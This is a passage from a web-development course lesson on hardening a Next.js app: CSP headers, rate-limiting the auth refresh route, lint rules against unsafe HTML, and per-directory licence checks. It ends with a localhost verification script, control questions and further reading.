| `login` / `logout` / `register` / `verify` | Zod (16.1) | `limit()` (16.2) | none |

### Still open after this lesson

1. **CSP is report-only.** Enforcing is a one-line PR, gated on two clean weeks (§5).
2. **`report-uri` has no collector.** Lesson 24.3 adds Sentry and points reports at it.
3. **The static policy allows inline script.** §3 lists exactly what that costs and the
   condition under which it is reversed.
4. **`npm audit` exceptions expire.** The monthly review is a calendar entry owned by a person,
   named here: <your name>.

### Licence regimes

| Directory | Licence | Forbidden |
|---|---|---|
| `next-app/` | MIT, proprietary application code | GPL, LGPL, AGPL — any copyleft |
| `wordpress-headless/wp-content/plugins/blame-the-tech-core/` | GPL-2.0-or-later | nothing; GPL is expected |

Checked per directory in CI, because no reviewer reads a `package-lock.json` diff.
```

**Verify §4:**

- [ ] Every row has a real answer. A blank cell is the question you have not asked.
- [ ] The "Still open" list has your name on item 4. An unowned review does not happen.
- [ ] `git diff docs/quality-gates.md` shows additions only, and Lesson 15.5's entry-point
      matrix is untouched.

### Step 5: Close the rate-limit gap Lesson 15.5 named

`POST /api/auth/refresh` has been the first item on 15.5's "Known gaps" list since Module 15.

```ts
// next-app/src/app/api/auth/refresh/route.ts — an anchored insertion at the TOP
// of the existing POST handler, before the refresh cookie is read. The rest of
// the handler is unchanged.
import { limit } from '@/lib/rate-limit';

// … inside POST(request: NextRequest):
  const ip = request.headers.get('x-forwarded-for')?.split(',')[0]?.trim() ?? 'unknown';
  const verdict = await limit(`refresh:${ip}`);

  if (!verdict.ok) {
    // ONE status for both 'exceeded' and 'unavailable'. A caller who can tell
    // them apart learns whether your Redis is up, and that is free
    // reconnaissance. The limiter FAILS CLOSED (Lesson 16.2 §5) — an
    // unreachable Redis refuses the refresh rather than allowing it.
    return new Response(null, { status: 429 });
  }
```

**Verify §5:**

- [ ] `grep -c 'rate-limit' src/app/api/auth/refresh/route.ts` is `1`, and it imports `limit`
      from `@/lib/rate-limit`. If you wrote a second limiter, delete it — Lesson 16.2's is
      fail-closed and unit-tested, and two limiters means two policies.
- [ ] The `!verdict.ok` branch returns **one** status for both failure reasons.
      `grep -c '503' src/app/api/auth/refresh/route.ts` is `0`.
- [ ] `npm run test:run` still passes, including `src/lib/rate-limit.test.ts`'s seven cases.
- [ ] Signing in still works. `RATE_LIMIT_MAX = 5` per ten minutes was tuned for a *form*, not a
      background renewal: if the near-expiry hand-off fires more than five times in ten minutes
      for one user, this is the number to revisit.

### Step 6: The licence check, per directory

Two directories, two opposite rules, so two invocations. Never one global run.

```bash
# next-app — proprietary. Any copyleft hit is a licensing problem, not a warning.
cd next-app
npx license-checker --production --summary
npx license-checker --production --failOn 'GPL-2.0;GPL-3.0;LGPL-2.1;LGPL-3.0;AGPL-3.0'

# the plugin — GPL by design. The check here is the OPPOSITE: confirm it IS GPL.
cd ../wordpress-headless/wp-content/plugins/blame-the-tech-core
grep -n '"license"' composer.json
```

**Verify §6:**

- [ ] The `--failOn` run exits `0` and prints nothing. A non-zero exit names the package —
      check whether it is a transitive dependency of something you chose, because that is how
      this happens.
- [ ] The summary includes `MIT`, `Apache-2.0`, `ISC` and `BSD-*`, and `isomorphic-dompurify` is
      Apache-2.0 / MPL-2.0 (Lesson 14.3 checked this before adding it). Both are fine for a
      proprietary module.
- [ ] The plugin's `composer.json` says `GPL-2.0-or-later`. **This is the positive that proves
      the check is per-directory and not global** — a repository-wide licence gate would fail on
      the half of this repository that is legally required to be GPL.
- [ ] Lesson 17.1 already made you run `npm view @faustwp/core license` rather than trust an
      assertion. Do the same for anything the summary lists that you cannot account for.

### Step 7: Confirm the Server Action origins, then run everything

`experimental.serverActions.allowedOrigins` already holds both hosts — **Lesson 15.5 Step 5 wrote
it and this step verifies it rather than adding it.** Both entries are load-bearing: every
Playwright address in this course is `127.0.0.1`, and a Server Action posted from
`127.0.0.1:3000` with only `localhost:3000` in the list is rejected by Next's origin check with
an error that names neither host.

```bash
cd next-app
grep -n 'allowedOrigins' next.config.ts
npm run type-check && npm run lint && npm run test:run && npm run build
npm audit --omit=dev --audit-level=high
```

**Verify §7:**

- [ ] `allowedOrigins` is `['localhost:3000', '127.0.0.1:3000']`. Both. Unchanged.
- [ ] All four npm commands exit `0`. `npm run lint` is the one that proves Step 3's rules do not
      fire on real code.
- [ ] `npm audit --omit=dev --audit-level=high` exits `0`, or every finding has an entry in Key
      Concept 10's table **with a date and a name**.
- [ ] `grep -r "$REVALIDATE_SECRET" .next/static/ 2>/dev/null` prints nothing. Hardening that
      leaks a secret into the bundle is not hardening.

### Step 8: Commit, and record what you did not do

```bash
git add -A
git commit -m "feat(web): CSP, security headers, lint-enforced sanitisation and licence gate"
```

**Verify §8:**

- [ ] The diff touches `next.config.ts`, `src/proxy.ts`, `eslint.config.mjs`,
      `package.json`, `src/app/api/auth/refresh/route.ts`, `docs/quality-gates.md`, and
      **deletes** `scripts/check-tag-literals.mjs`.
- [ ] The diff does **not** touch `src/app/[locale]/layout.tsx`. If it does, you put a nonce read
      in the root layout and forfeited every static route — Lesson 18.1, Key Concept 2, and
      Module 21's budgets, all at once.
- [ ] `git diff HEAD~1 -- src/proxy.ts | grep -c matcher` is `0`.

---

## Verification

```bash
cd next-app
npm run build && npm start &   # `next start`, not `next dev` — dev serves different headers
sleep 8

# 1. VERIFY AGAINST A RESPONSE, NOT AGAINST THE CONFIG FILE. This distinction is
#    the whole point: a header in next.config.ts that a matcher never applies is
#    a header you believe you have.
curl -sI http://localhost:3000/en | grep -iE 'strict-transport|referrer-policy|x-content-type|x-frame|permissions-policy'
# Expected: five lines, one per header, from the next.config.ts entry in Step 1

# 2. The CSP is on the page routes, in report-only mode
curl -sI http://localhost:3000/en | grep -ic 'content-security-policy-report-only'
# Expected: 1
curl -sI http://localhost:3000/en | grep -ic '^content-security-policy:'
# Expected: 0 — enforcing is a separate one-line PR (§5)

# 3. NEGATIVE — exactly ONE CSP header on a personalised route. Two would be
#    enforced as an INTERSECTION, not a replacement (§4).
curl -sI http://localhost:3000/en/account | grep -ci 'content-security-policy'
# Expected: 1. A 2 means the CSP is also in next.config.ts — remove it there.

# 4. NEGATIVE — no 'unsafe-eval', anywhere, in the policy a browser receives
curl -sI http://localhost:3000/en | grep -i 'content-security-policy' | grep -c "unsafe-eval"
# Expected: 0
grep -c "unsafe-eval" src/proxy.ts
# Expected: 0

# 5. The strict directives that do the work are all present on a real response
curl -sI http://localhost:3000/en | grep -i 'content-security-policy' \
  | grep -oE "object-src 'none'|base-uri 'none'|frame-ancestors 'none'|form-action 'self'|default-src 'self'" | sort
# Expected: five lines. These are the six-of-eight in §3's attack table.

# 6. The nonce variant is served on the personalised routes and NOT elsewhere
curl -sI http://localhost:3000/en/account | grep -i 'content-security-policy' | grep -oc "nonce-"
# Expected: 1
# 6b. NEGATIVE — a statically-rendered route must NOT get a nonce. A nonce there
#     means the route went dynamic and Module 21's budgets are already wrong.
curl -sI http://localhost:3000/en/incidents | grep -i 'content-security-policy' | grep -c "nonce-"
# Expected: 0
curl -sI http://localhost:3000/en/incidents | grep -i 'content-security-policy' | grep -c "unsafe-inline"
# Expected: 1 — the static variant, deliberately (§3)

# 7. NEGATIVE — dangerouslySetInnerHTML is still in exactly ONE file
grep -rl 'dangerouslySetInnerHTML' src/ | wc -l
# Expected: 1
grep -rl 'dangerouslySetInnerHTML' src/
# Expected: src/components/blocks/RichText.tsx and nothing else

# 8. NEGATIVE — the new ESLint rules FIRE on a probe file. A selector that
#    matches nothing is a green lint run and a control that does not exist.
cat > src/_lint-probe.tsx <<'PROBE'
export function Probe({ html }: { html: string }) {
  const tag = 'incident:en:incident-01';
  const list = 'incidents';
  return <div data-tag={tag + list} dangerouslySetInnerHTML={{ __html: html }} />;
}
PROBE
npx eslint src/_lint-probe.tsx; echo "exit=$?"
# Expected: exit=1, with THREE no-restricted-syntax errors — the JSX attribute,
#           the node tag literal and the list tag literal.
rm src/_lint-probe.tsx

# 9. ...and do NOT fire on the real code, including the two exempt tag files
npx eslint src/lib/graphql/tags.ts src/components/blocks/RichText.tsx 'src/app/[locale]/[...slug]/page.tsx'
# Expected: no output, exit 0. The exemption objects in Step 3 are what make this
#           pass; if tags.ts errors, the `files` array does not match its path.

# 10. NEGATIVE — the retired script and its npm script are both gone
test ! -f scripts/check-tag-literals.mjs && echo "script removed: ok"
# Expected: script removed: ok
npm pkg get scripts.lint:tags
# Expected: {} — the rule replaced it; they do not coexist (Step 3)

# 11. NEGATIVE — no GPL or AGPL dependency in next-app
npx license-checker --production --failOn 'GPL-2.0;GPL-3.0;LGPL-2.1;LGPL-3.0;AGPL-3.0'; echo "exit=$?"
# Expected: exit=0, no output

# 11b. ...and the PLUGIN is GPL. The positive that proves the check is
#      per-directory: a repository-wide gate would fail on this half.
grep -o '"license": *"[^"]*"' ../wordpress-headless/wp-content/plugins/blame-the-tech-core/composer.json
# Expected: "license": "GPL-2.0-or-later"

# 12. NEGATIVE — allowedOrigins holds 127.0.0.1:3000, not just localhost.
#     Every Playwright address in this course is 127.0.0.1.
grep -c '127.0.0.1:3000' next.config.ts
# Expected: 1. A 0 means every Server Action in the Playwright suite fails
#           Next's origin check, with an error that names neither host.
grep -c "'localhost:3000'" next.config.ts
# Expected: 1 — both entries, as Lesson 15.5 Step 5 wrote them

# 13. NEGATIVE — config.matcher did not move
git diff HEAD~1 -- src/proxy.ts | grep -cE '^[-+].*matcher'
# Expected: 0. Lesson 15.5 §4 forbids editing it and Lesson 20.3 obeyed.

# 14. NEGATIVE — the i18n wrapper survived
grep -c 'withNextIntl' next.config.ts
# Expected: 2. A 1 means the export lost next-intl: pages render and every
#           t() throws on the first request, with no build error.

# 15. NEGATIVE — the root layout was not touched. A nonce read there forfeits
#     every static route (Lesson 18.1) and Module 21's budgets with it.
git diff HEAD~1 --stat -- 'src/app/[locale]/layout.tsx' | wc -l
# Expected: 0
grep -rc "headers()" 'src/app/[locale]/layout.tsx'
# Expected: 0

# 16. NEGATIVE — no secret reached the client bundle
grep -r "$REVALIDATE_SECRET" .next/static/ 2>/dev/null; echo "exit=$?"
# Expected: exit=1 (grep found nothing)

# 17. The gates all pass, and npm audit has a policy rather than a shrug
npm run type-check && npm run lint && npm run test:run
# Expected: all three exit 0
npm audit --omit=dev --audit-level=high; echo "exit=$?"
# Expected: exit=0, or every finding has a dated, named entry per §10

kill %1
```

Check 3 is the one to re-read if the CSP behaves oddly: two `Content-Security-Policy` headers are
enforced as the intersection, so a page can break in a way neither policy explains alone. Check 8
is the one never to skip — an ESLint selector with a typo produces a clean lint run and no
protection, and the only way to tell is to make it fail on purpose.

## Control Questions

1. The static policy allows `'unsafe-inline'` on `script-src`, and the nonce policy does not
   include it at all. Explain why adding `'unsafe-inline'` to the nonce policy as a fallback
   would make it strictly worse than leaving it out, and say what a reviewer reading only the
   diff would wrongly conclude.
2. Suppose a future lesson adds an HTML route at `/en/report.html`. Trace which of the six headers
   that route receives and which it does not, name the file each verdict comes from, and say what
   you would change — given that `config.matcher` may not be edited.
3. The request id is minted **before** next-intl runs, and the security headers are attached
   **after** the auth gate. Swap those two positions in your head and describe the concrete
   observable bug each swap produces, using a request to `/account` with no session as the example.
4. `/api/health` deliberately has no rate limit, while `/api/auth/refresh` just gained one. Both
   are unauthenticated at the moment the request arrives. Explain what makes the two different,
   and describe the attack the health endpoint's exemption leaves available.
5. The licence check runs twice with opposite expectations. Someone proposes replacing it with one
   repository-wide `license-checker` run and an allowlist of "licences we accept". Say exactly
   what breaks, and name a third directory that would make the per-directory design necessary
   even if the plugin did not exist.

## Learn More

- [Next.js — Content Security Policy](https://nextjs.org/docs/app/guides/content-security-policy) —
  Next's own nonce recipe; read it **and then** read Key Concept 2, because the guide does not
  mention what the recipe costs a statically-rendered app
- [MDN — CSP `script-src`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src) —
  the paragraph confirming that `'unsafe-inline'` is ignored when a nonce or hash is present, which
  is the fact that makes the split in §3 unavoidable
- [Google — CSP evaluator](https://csp-evaluator.withgoogle.com/) — paste the policy from
  Verification check 5 into it; the warnings it raises about `'unsafe-inline'` are correct and §3
  is the answer to them
- [MDN — Strict-Transport-Security](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security) —
  read the preload section before you add `preload`; it is the one header in this lesson you
  cannot take back
- [Next.js — `headers()` in `next.config.js`](https://nextjs.org/docs/app/api-reference/config/next-config-js/headers) —
  the `source` matching rules, and confirmation that a response collects entries from every match
  rather than the first
- [Next.js — Server Actions security](https://nextjs.org/docs/app/guides/data-security) —
  what the built-in origin check does, what `allowedOrigins` adds, and the cases neither covers
- [ESLint — `no-restricted-syntax`](https://eslint.org/docs/latest/rules/no-restricted-syntax) —
  and the [esquery](https://github.com/estools/esquery) selector syntax, including the regex
  attribute form the three tag rules in Step 3 rely on
- [ESLint — `linterOptions.reportUnusedDisableDirectives`](https://eslint.org/docs/latest/use/configure/configuration-files#reporting-unused-disable-directives) —
  already set by Lesson 07.5, and the reason a stale suppression is worse than no suppression;
  read it before you are tempted to add a second `linterOptions` block
- [`license-checker`](https://github.com/davglass/license-checker) — the `--failOn` and
  `--production` flags, and the reason a `--summary` run is a review aid rather than a gate
